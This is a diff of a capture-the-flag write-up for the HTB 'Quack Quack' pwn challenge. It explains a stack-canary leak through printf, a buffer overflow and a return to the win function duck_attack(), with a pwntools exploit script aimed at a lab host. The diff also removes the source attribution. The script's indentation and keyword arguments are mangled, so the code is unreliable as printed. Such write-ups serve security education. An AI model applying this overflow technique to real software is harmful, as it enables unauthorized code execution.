@@ -1,23 +1,16 @@
 # :game_die: HTB: Cyber Apocalypse 2025 - Quack Quack
 
-> **Original Source:** [HTB: Cyber Apocalypse 2025 - Quack Quack](https://infosecwriteups.com/htb-cyber-apocalypse-2025-quack-quack-1775cefc26ae)
-> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2025
-
 ---
 
 # HTB: Cyber Apocalypse 2025 — Quack Quack
 
-
 Difficulty: Easy
 
-
 ### Description
-
 
 On the quest to reclaim the Dragon’s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it’s time to face the Duck!
 
 ### Protection (checksec)
-
 
 ```
 $ checksec
@@ -29,37 +22,27 @@ PIE: No PIE (0x400000)
 RUNPATH: b'./glibc/'
 ```
 
-
 ### Disassembly (ghidra)
-
 
 *duckling() function*
 
-
 In this function, there is a read where we should put “Quack Quack “ somewhere to bypass the first check. Because of strstr(), it does not matter where.
-
 
 In the next section, the printf() will print the string after the “Quack Quack “ by shifting 30 bytes. If we place it in the right position, it will print out the stack canary.
 
-
 ## Get Szigecsán Dávid’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
-
 
 Finally, we can read another text that can override the whole stack, the canary, the base pointer, and even the return address.
 
 *Win function*
 
-
 As we have a win function called duck_attack(), we can put its address to the place of return address.
 
 ### Exploitation
-
 
 - Write the right amount of garbage (89 bytes of ‘A’) followed by the ‘Quack Quack ‘
 
@@ -68,7 +51,6 @@ As we have a win function called duck_attack(), we can put its address to the pl
 - Write the right amount of garbage (88 bytes of ‘B’) followed by the canary followed by some garbage (8 bytes of ‘C’) followed by the address of duck_attack()
 
 ### Solution (pwntools)
-
 
 ```
 #!/usr/bin/env python3
@@ -90,7 +72,6 @@ context(terminal=['tmux', 'split-window', '-h'])
 host = args.HOST or '10.10.10.10'
 port = int(args.PORT or 1337)
 
-
 def start_local(argv=[], *a, kw):
 '''Execute the target binary locally'''
 if args.GDB:
@@ -98,14 +79,12 @@ return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, kw)
 else:
 return process([exe.path] + argv, *a, kw)
 
-
 def start_remote(argv=[], *a, kw):
 '''Connect to the process on the remote host'''
 io = connect(host, port)
 if args.GDB:
 gdb.attach(io, gdbscript=gdbscript)
 return io
-
 
 def start(argv=[], *a, kw):
 '''Start the exploit against the target.'''
@@ -157,9 +136,7 @@ warning('Flag: ' + io.recv().decode('utf-8'))
 io.interactive()
 ```
 
-
 ### Skills Learned
-
 
 - leaking information (canary)
 
@@ -170,6 +147,3 @@ io.interactive()
 - bypass canary
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-cyber-apocalypse-2025-quack-quack-1775cefc26ae). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
